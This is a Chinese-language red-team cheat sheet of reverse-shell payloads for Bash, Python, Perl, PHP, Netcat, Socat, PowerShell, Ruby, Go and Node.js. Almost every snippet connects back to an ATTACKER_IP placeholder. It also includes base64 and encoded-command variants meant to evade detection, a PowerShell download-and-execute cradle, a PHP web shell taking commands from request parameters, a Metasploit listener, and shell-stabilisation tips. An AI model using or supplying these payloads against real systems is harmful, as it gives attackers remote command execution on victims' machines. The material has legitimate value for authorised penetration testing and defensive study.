# 反弹Shell全集：Bash、Python、Perl、PHP、NC

反弹Shell（Reverse Shell）是红队渗透测试中最基础也是最重要的技术之一。当目标机器位于内网或有防火墙限制入站连接时，反弹Shell允许攻击者从目标机器主动连接到攻击者的控制服务器，从而建立交互式命令行通道。

---

## 基本原理

反弹Shell的核心思想是：让目标主机主动发起一个到攻击者主机的TCP/UDP连接，然后将目标主机的输入/输出重定向到这个网络连接上。

```
目标主机（内网）----主动连接----> 攻击者主机（公网VPS）
      |                                    |
      |  stdin/stdout 通过 socket 传输      |
      |<---------------------------------->|
```

### 为什么需要反弹Shell？

1. **防火墙限制**：目标主机可能禁止外部主动连接（入站规则），但允许出站连接
2. **NAT穿透**：内网主机没有公网IP，外部无法直接访问
3. **交互式控制**：提供完整的命令行交互环境
4. **持久访问**：作为后续操作的基础设施

---

## Bash反弹Shell

### 基础形式：/dev/tcp

Bash 内置的 `/dev/tcp` 设备文件提供了网络通信能力，无需安装额外工具。

```bash
# 攻击者监听
nc -lvnp 4444

# 目标执行
bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1
```

**原理详解**：
- `bash -i`：启动一个交互式bash shell
- `>& /dev/tcp/IP/PORT`：将stdout和stderr重定向到TCP连接
- `0>&1`：将stdin重定向到stdout（即网络连接）

### 完整版（带文件描述符）

```bash
# 更可靠的写法，使用exec
exec 5<>/dev/tcp/ATTACKER_IP/4444
cat <&5 | while read line; do $line 2>&5 >&5; done
```

### Base64编码版（绕过简单检测）

```bash
# 攻击者准备
echo "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1" | base64

# 目标执行（假设base64编码后的字符串为 YmFzaCAtaSA+...）
echo YmFzaCAtaSA+... | base64 -d | bash
```

### /dev/udp版

```bash
# 使用UDP协议（更隐蔽但不稳定）
bash -i >& /dev/udp/ATTACKER_IP/4444 0>&1
```

### 一行命令变形

```bash
# 0<&196;exec 196<>/dev/tcp/ATTACKER_IP/4444;sh <&196 >&196 2>&196

# 使用mkfifo
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
```

---

## Python反弹Shell

### Python 2

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
```

### Python 3

```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
subprocess.call(["/bin/bash","-i"])
```

### Python一句话

```python
# Python 2
python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'

# Python 3
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",4444));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call(["/bin/bash","-i"])'
```

### Python PTY升级版

```python
import socket,subprocess,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("ATTACKER_IP",4444))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
pid=os.fork()
if pid==0:
    os.setsid()
    pty.spawn("/bin/bash")
```

---

## Perl反弹Shell

### 标准版

```perl
perl -e 'use Socket;$i="ATTACKER_IP";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/bash -i");};'
```

### Perl Socket版

```perl
perl -MIO -e '$p=fork;exit,if($p);$c=new IO::Socket::INET->new(PeerAddr=>"ATTACKER_IP:4444");STDIN->fdopen($c,r);$~->fdopen($c,w);system$_ while<>;'
```

### Perl更可靠版本

```perl
perl -e '
use Socket;
my $i = "ATTACKER_IP";
my $p = 4444;
socket(S, PF_INET, SOCK_STREAM, getprotobyname("tcp"));
if(connect(S, sockaddr_in($p, inet_aton($i)))) {
    open(STDIN, ">&S");
    open(STDOUT, ">&S");
    open(STDERR, ">&S");
    exec("/bin/bash -i");
};'
```

---

## PHP反弹Shell

### 标准版

```php
php -r '$sock=fsockopen("ATTACKER_IP",4444);exec("/bin/bash -i <&3 >&3 2>&3");'
```

### PHP File Descriptors

```php
php -r '$sock=fsockopen("ATTACKER_IP",4444);$proc=proc_open("/bin/bash -i",array(0=>$sock,1=>$sock,2=>$sock),$pipes);'
```

### PHP更完整版

```php
<?php
$sock = fsockopen("ATTACKER_IP", 4444);
$descs = array(0 => $sock, 1 => $sock, 2 => $sock);
$process = proc_open("/bin/bash -i", $descs, $pipes);
?>
```

### PHP Exec版

```php
php -r 'exec("bash -c '\''bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'\''");'
```

### PHP Through File

```php
<?php
$command = $_REQUEST['cmd'];
$output = shell_exec($command);
echo "<pre>$output</pre>";
?>
```

---

## Netcat反弹Shell

### 标准版

```bash
# 目标执行（nc版本需要-e参数支持）
nc ATTACKER_IP 4444 -e /bin/bash

# 如果nc不支持-e，使用管道方式
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/bash -i 2>&1|nc ATTACKER_IP 4444 >/tmp/f
```

### Netcat无-e版本

```bash
# 方法1：使用mkfifo
mkfifo /tmp/f; cat /tmp/f | /bin/bash -i 2>&1 | nc ATTACKER_IP 4444 > /tmp/f

# 方法2：使用/dev/tcp（如果nc不支持-e）
nc ATTACKER_IP 4444 | /bin/bash
```

### Netcat监听端

```bash
# 攻击者启动监听
nc -lvnp 4444

# 或使用metasploit
msfconsole -q -x "use exploit/multi/handler; set payload cmd/unix/reverse_netcat; set LHOST 0.0.0.0; set LPORT 4444; exploit"
```

---

## Socat反弹Shell

### 基础反弹

```bash
# 目标执行
socat TCP:ATTACKER_IP:4444 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

### 加密反弹

```bash
# 生成证书
openssl req -newkey rsa:2048 -nodes -keyout shell.key -x509 -days 30 -out shell.crt -subj "/CN=shell"
cat shell.key shell.crt > shell.pem

# 攻击者监听
socat OPENSSL-LISTEN:4444,cert=shell.pem,verify=0 STDOUT

# 目标执行
socat OPENSSL:ATTACKER_IP:4444,verify=0 EXEC:/bin/bash,pty,stderr,setsid,sigint,sane
```

---

## PowerShell反弹Shell

### 标准版

```powershell
# PowerShell反弹
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('ATTACKER_IP',4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```

### PowerShell Download Cradle

```powershell
# 下载执行
powershell -nop -c "IEX(New-Object Net.WebClient).DownloadString('http://ATTACKER_IP/shell.ps1')"
```

### PowerShell Encoded Command

```powershell
# 编码绕过（用base64编码上面的命令）
powershell -EncodedCommand <base64_string>
```

---

## 其他语言反弹Shell

### Ruby

```ruby
ruby -rsocket -e'f=TCPSocket.open("ATTACKER_IP",4444).to_i;exec sprintf("/bin/bash -i <&%d >&%d 2>&%d",f,f,f)'
```

### Java

```java
Runtime r = Runtime.getRuntime();
Process p = r.exec("/bin/bash -i");
// 需要重定向IO到socket
```

### Golang

```go
package main
import(
    "os"
    "os/exec"
    "net"
)
func main(){
    c,_ := net.Dial("tcp","ATTACKER_IP:4444")
    cmd := exec.Command("/bin/bash")
    cmd.Stdin = c
    cmd.Stdout = c
    cmd.Stderr = c
    cmd.Run()
}
```

### Node.js

```javascript
var net = require('net');
var spawn = require('child_process').spawn;
var sh = spawn('/bin/bash', []);
var client = new net.Socket();
client.connect(4444, 'ATTACKER_IP', function(){
    sh.stdin.pipe(client);
    sh.stdout.pipe(client);
    sh.stderr.pipe(client);
});
```

---

## 实战技巧与注意事项

### 1. Shell升级为完全交互式

反弹shell获取后，通常不是完全交互式的，需要升级：

```bash
# 目标执行
python -c 'import pty; pty.spawn("/bin/bash")'
# 或
script /dev/null
# 然后 Ctrl+Z 后执行
stty raw -echo; fg
# 回车后输入
export TERM=xterm
```

### 2. 保持Shell稳定

```bash
# 使用screen保持会话
screen -S session_name

# 使用tmux
tmux new -s session_name
```

### 3. 自动检测可用语言

```bash
#!/bin/bash
# 检测目标系统可用的反弹shell语言
for lang in python python3 perl php ruby node java nc socat; do
    if command -v $lang &> /dev/null; then
        echo "[+] $lang 可用"
    fi
done
```

### 4. 防火墙检测

在反弹前，先检测出站连接是否受限：

```bash
# 测试是否能连接外部
timeout 5 bash -c "echo > /dev/tcp/ATTACKER_IP/4444" 2>/dev/null
if [ $? -eq 0 ]; then
    echo "[+] 出站连接正常"
else
    echo "[-] 出站连接受限，尝试其他端口或协议"
fi
```

---

## 总结对比

| 语言 | 依赖 | 隐蔽性 | 稳定性 | 推荐场景 |
|------|------|--------|--------|----------|
| Bash | 无 | 低 | 中 | 通用场景 |
| Python | python | 低 | 高 | Linux服务器 |
| Perl | perl | 中 | 高 | 老旧系统 |
| PHP | php | 中 | 中 | Web服务器 |
| NC | netcat | 低 | 中 | 快速测试 |
| Socat | socat | 中 | 高 | 加密通信 |
| PowerShell | Windows | 中 | 高 | Windows环境 |

---

*最后更新：2026-08-22*
